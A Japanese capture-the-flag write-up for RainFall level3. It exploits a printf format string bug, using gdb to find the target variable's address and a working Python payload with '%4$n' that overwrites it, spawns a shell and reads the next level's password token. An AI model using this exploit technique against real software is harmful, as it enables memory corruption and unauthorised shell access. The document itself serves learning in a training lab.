# level3

## 方針
source.cを確認すると、if (m == 0x40)を突破すればshを呼び出しているコードに到達する。
format string attack行いmのアドレスを書き換える。

printfの第一引数の文字列に書式トークンがある場合、varargsがstackにつまれてるデータを使用する。
しかし、可変長引数がない場合に書式トークンがあると、すでに存在するstackに積まれてあるデータreadするため、stackの中身が見えてしまう。
しかも,`%1$n`を使うとスタックの`%n`番目のアドレスを参照し、printfで出力した文字数を参照先に書き込む。

つまり, mのアドレスを指定し64(0x40)文字出力してあげれば0x40になる。

### AAAA の場所を確認
```
level3@RainFall:~$ ./level3
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x4141414
```
上記から4番目にprintfの引数があることがわかる。

### mのアドレスを確認する
```
level3@RainFall:~$ gdb ./level3
(gdb) disass v
....
0x080484da <+54>:    mov    0x804988c,%eax
0x080484df <+59>:    cmp    $0x40,%eax
....
```

### ans
mのアドレス: 0x804988c 4文字
フィールド幅: 0x60 60文字
書き込み先のスタックの位置

```
level3@RainFall:~$ (python -c 'import sys; sys.stdout.write("\x8c\x98\x04\x08" + "%60x" + "%4$n")' ; cat) | ./level3
echo a
�                                                         200echo a
Wait what?!
pwd
/home/user/level3
cd /home/user/level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## memo

## format string attackとは
`printf(入力文字列)` の脆弱性を利用して特定のアドレスに`write`する。
これは`printf()` 入力を書式トークンを通さずに書式文字列として利用すると発生する。


[https://ja.wikipedia.org/wiki/書式文字列攻撃](https://ja.wikipedia.org/wiki/%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E5%88%97%E6%94%BB%E6%92%83)